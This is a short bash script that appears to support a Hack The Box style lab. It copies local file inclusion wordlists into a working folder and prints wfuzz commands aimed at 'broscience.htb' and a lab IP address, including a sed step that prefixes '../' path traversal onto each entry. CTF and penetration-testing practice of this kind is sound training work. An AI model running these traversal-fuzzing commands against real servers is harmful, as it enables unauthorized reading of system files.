#!/usr/bin/bash

# This script prepares tools and links for LFI exploitation


if [ "$1" = "-r" ] ; then

    dir="lfi"
    
    if [[ -d $PWD/$dir ]]
    then
	rm -rf $PWD/$dir/*
    fi
    exit
  
else
    
    dir="lfi"

	if [[ ! -d $PWD/$dir ]]
	then
		mkdir -p $dir
	fi

    if [[ -d $PWD/$dir ]]
    then
	cp /opt/fuzz/lfi/LFI-long.txt $dir
	cp /opt/fuzz/lfi/LFI-medium-dotdotpwn.txt $dir
	cp /opt/fuzz/lfi/LFI-short-crimson.txt $dir
	
	echo "Copying all tools...done"
	ls $dir
	echo ""
	echo "Command: wfuzz -w lfi/LFI-medium-dotdotpwn.txt -u 'https://broscience.htb/includes/img.php?path=FUZZ' -c --hh 30,0"
	echo "         wfuzz -w lfi/LFI-long.txt -u 'https://broscience.htb/includes/img.php?path=FUZZ' -c --hh 30,0"
	echo "         sed 's/^/..\/..\/..\/..\/..\/../' lfi/LFI-short-crimson.txt > lfi/LFI-short-crimson_new.txt"
	echo "         wfuzz -w lfi/LFI-short-crimson_new.txt -u 'http://10.129.231.92:8080/show_image?img=FUZZ' -c --hh 431,0" 
	chmod 755 $dir/*
	
    else
	echo "No $dir directory exists"
    fi
fi

